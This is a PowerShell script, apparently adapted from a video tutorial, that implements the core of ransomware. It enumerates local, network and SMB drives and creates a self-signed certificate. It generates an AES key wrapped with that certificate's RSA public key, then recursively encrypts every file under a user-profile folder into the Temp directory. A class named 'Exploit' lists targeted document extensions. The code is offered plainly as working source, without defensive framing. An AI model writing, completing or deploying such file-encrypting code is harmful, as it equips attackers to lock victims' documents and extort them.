# Based on the script found here https://www.youtube.com/watch?v=atL1WmmMJJw

Class Drive 
{
    [String]                $Name
    Hidden [String] $FullProvider
    [String]            $Provider
    [String]                $Root
    [String]         $DisplayRoot
    [String]         $Description
    Hidden [Int32]          $Mode

    Drive([Object]$Drive)
    {
        $This.Name                = $Drive.Name
        $This.FullProvider        = $Drive.Provider
        $This.Provider            = Split-Path -Leaf $Drive.Provider
        $This.Root                = $Drive.Root
        $This.DisplayRoot         = $Drive.DisplayRoot
        $This.Description         = If ( ! $Drive.Description ) { "-" } Else { $Drive.Description }
        $This.Mode                = Switch ( Split-Path -Leaf $Drive.Provider )
        { 
            FileSystem   {0} Certificate  {1} Environment  {2} Registry     {3} Temp         {4} 
            Alias        {5} Function     {6} Variable     {7} WSMan        {8} Default     {-1} 
        }
    }
}

Class Drives
{
    [Object[]]          $PSDrives
    [Object[]]        $FileSystem
    [Object[]]           $Network
    [Object[]]             $Samba

    Drives()
    {
        $This.PSDrives            = Get-PSDrive      | % { [Drive]::New($_) } | Sort-Object Mode
        $This.FileSystem          = $This.PSDrives   | ? Mode -eq 0
        $This.Network             = $This.FileSystem | ? DisplayRoot
        $This.Samba               = Get-SMBShare     | Sort-Object Path
    }
}

Class Certificate
{
    [Object] $Certificate

    Certificate([String]$CertStoreLocation,[String]$DNSName)
    {
        $This.Certificate         = New-SelfSignedCertificate -CertStoreLocation $CertStoreLocation -DNSName $DNSName
    }
}

Class Certification
{
    [Object]            $Provider
    [Object]        $KeyFormatter

    [Object]              $Public
    [Object]             $Private
    [Byte[]]         $KeyExchange

    [Int32]         $KeyLengthInt
    [Byte[]]      $KeyLengthBytes    
    [Int32]          $IVLengthInt
    [Byte[]]       $IVLengthBytes

    Certification([System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate)
    {
        $This.Provider            = [System.Security.Cryptography.AesManaged]::new()
        $This.Provider.KeySize    = 256
        $This.Provider.BlockSize  = 128
        $This.Provider.Mode       = [System.Security.Cryptography.Ciphermode]::CBC

        $This.Public              = $Certificate.PublicKey.Key
        $This.Private             = $This.Provider.Key

        $This.KeyFormatter        = [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]::New($This.Public)
        $This.KeyExchange         = $This.KeyFormatter.CreateKeyExchange($This.Private,$This.Provider.GetType())

        $This.KeyLengthInt        = $This.KeyExchange.Length
        $This.KeyLengthBytes      = [System.BitConverter]::GetBytes($This.KeyLengthInt)
        $This.IVLengthInt         = $This.Provider.IV.Length
        $This.IVLengthBytes       = [System.BitConverter]::GetBytes($This.IVLengthInt)
    }
}

Class Exploit
{
    [String] $CSV               = "C:\Windows\Temp\Drives.csv"
    [Object] $CSVContent        = $Null
    
    [String] $AttackCSV         = "C:\Windows\Temp\Attack.csv"
    [Object] $AttackCSVContent  = $Null

    [String[]] $Extensions      = ".pptx .docx .doc .xls .xlxx .pdf .txt .dot" -Split " "

    Exploit(){}
}

Class CryptoStream
{
    [Object]                    $Provider
    [Object]                   $Transform
    [Object]                        $Mode
    [Object]           $InputStreamReader
    [Object]           $InputStreamWriter

    [Int32]                       $XCount
    [Int32]                      $XOffset
    [Int32]              $XBlockSizeBytes
    [Byte[]]                       $XData
    [Int32]                   $XBytesRead

    [Object]                      $Stream

    CryptoStream([Object]$Provider,[System.IO.Stream]$InputStreamReader,[System.IO.Stream]$InputStreamWriter)
    {
        $This.Provider              = $Provider
        $This.InputStreamReader     = $InputStreamReader
        $This.InputStreamWriter     = $InputStreamWriter
        $This.Transform             = $Provider.CreateEncryptor()
        $This.Mode                  = [System.Security.Cryptography.CryptoStreamMode]::Write

        $This.XCount                = 0
        $This.XOffset               = 0
        $This.XBlockSizeBytes       = $This.Provider.BlockSize / 8
        $This.XData                 = [Byte[]]::New($This.XBlockSizeBytes)
        $This.XBytesRead            = 0

        $This.Stream                = [System.Security.Cryptography.CryptoStream]::New($This.InputStreamWriter,$This.Transform,$This.Mode)

        Do
        {
            $This.XCount            = $This.InputStreamReader.Read($This.XData,0,$This.XBlockSizeBytes)
            $This.XOffset          += $This.XCount
            $This.Stream.Write($This.XData,0,$This.XCount)
            $This.XBytesRead       += $This.XBlockSizeBytes
        }
        While ( $This.XCount -gt 0 )
        
        $This.Stream.FlushFinalBlock()
        $This.Stream.Close()
        $This.InputStreamReader.Close()
        $This.InputStreamWriter.Close()
    }
}

Class FileStream
{
    Hidden [Object]       $Provider
    [String]              $FullName
    [String]                  $Name
    [DateTime]                $Date
    [String]               $NewPath

    [System.IO.FileStream]  $Reader
    [System.IO.FileStream]  $Writer
    [CryptoStream]          $Crypto

    FileStream([String]$Path,[Object]$Provider)
    {
        If ( ! ( Test-Path $Path ) )
        {
            Throw "Unable to open outout file for writing"
        }

        $This.Provider      = $Provider
        $This.FullName      = $Path
        $This.Name          = Split-Path -Leaf $Path
        $This.Date          = Get-Date
        $This.NewPath       = $Env:Temp, $This.Name -join "\"

        $This.Reader        = [System.IO.FileStream]::New( $This.Fullname, [System.IO.FileMode]::Open )
        $This.Writer        = [System.IO.FileStream]::New( $This.NewPath,  [System.IO.FileMode]::Create )

        $This.Crypto        = [CryptoStream]::New( $This.Provider, $This.Reader, $This.Writer)
    }
}

Class System
{
    [String]         $Hostname
    [String]         $Username
    [Object]        $Principal
    [Object]          $Profile

    [Drives]           $Drives
    [Drive[]]      $FileSystem
    [Drive[]]         $Network
    [Object[]]          $Samba
    
    [System.Security.Cryptography.X509Certificates.X509Certificate2] $Certificate
    [Object]    $Certification
    [Object]         $Provider

    [Object]          $Exploit
    [String[]]          $Files
    [Object[]]           $Swap
    [Object[]]         $Output

    System()
    {
        Invoke-Expression "Using Namespace System.Security.Cryptography"

        $This.Hostname         = @( $Env:ComputerName , "$Env:ComputerName.$ENV:UserDNSDomain" )[ ( Get-CimInstance Win32_ComputerSystem ).PartOfDomain ].ToLower()
        $This.Username         = [Environment]::UserName
        $This.Principal        = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
        $This.Profile          = Get-ChildItem $Env:UserProfile | ? Name -in <#"Desktop Documents Downloads Pictures".Split(" ")#> Documents2
        
        [Drives]::New()        | % { 
        
            $This.Drives       = $_
            $This.FileSystem   = $_.FileSystem
            $This.Network      = $_.Network
            $This.Samba        = $_.Samba 
        }
        
        $This.Certificate      = [Certificate]::New("Cert:\LocalMachine\My",$This.Hostname).Certificate
        $This.Certification    = [Certification]::New($This.Certificate)
        $This.Provider         = $This.Certification.Provider

        $This.Exploit          = [Exploit]::New()
        $This.Files            = ForEach ( $File in $This.Profile ) { Get-ChildItem -Path $File -Recurse -Force | ? PSIsContainer -ne $True | % FullName }
        $This.Swap             = ForEach ( $File in $This.Files   ) { [FileStream]::New($File,$This.Provider) } 
    }
}

$Dr = [System]::New()
